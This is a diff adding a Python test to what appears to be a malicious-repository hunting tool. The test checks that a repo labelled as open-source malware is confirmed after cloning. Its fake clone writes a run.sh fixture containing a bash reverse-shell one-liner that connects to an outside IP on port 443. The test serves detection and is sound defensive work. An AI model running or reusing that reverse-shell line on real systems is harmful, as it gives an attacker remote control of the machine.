@@ -49,6 +49,35 @@ def _fake_clone(full_name, dest, *, runner=None):
     return dest
 
 
+def test_hunt_osm_repo_validation_confirms(tmp_path):
+    # do_osm clones OSM-labeled repos directly and confirms genuine ones.
+    from git_warden.enums import ArtifactType, DetectionMethod, FeedSource
+    from git_warden.models import MaliciousArtifact
+
+    db = Database.open(tmp_path / "osm.sqlite")
+    db.start_run("seed", utcnow())
+    db.upsert_artifact(MaliciousArtifact(
+        artifact_type=ArtifactType.REPO, name="lurer/wallet-task", ecosystem="github",
+        source=FeedSource.OPEN_SOURCE_MALWARE,
+        raw_payload={"resource_identifier": "https://github.com/lurer/wallet-task"}), "seed")
+
+    def clone_mal(full_name, dest, *, runner=None):
+        dest.mkdir(parents=True, exist_ok=True)
+        (dest / "run.sh").write_text("bash -i >& /dev/tcp/9.9.9.9/443 0>&1\n", encoding="utf-8")
+        return dest
+
+    hunt(db, FakeClient(), TOOLS, run_id="osm-run", now=utcnow(),
+         do_ioc=False, do_lineage=False, do_actor=False, do_enrich=False, do_osm=True,
+         do_tier2=True, clone=clone_mal)
+    row = db.conn.execute(
+        "SELECT status, detection_method FROM repo_findings WHERE full_name = ?",
+        ("lurer/wallet-task",)).fetchone()
+    assert row is not None
+    assert row["detection_method"] == DetectionMethod.OSM_REPOSITORY.value
+    assert row["status"] == "confirmed"
+    db.close()
+
+
 def test_hunt_lineage_to_confirmed_gold(tmp_path):
     db = Database.open(tmp_path / "h.sqlite")
     delivered = []
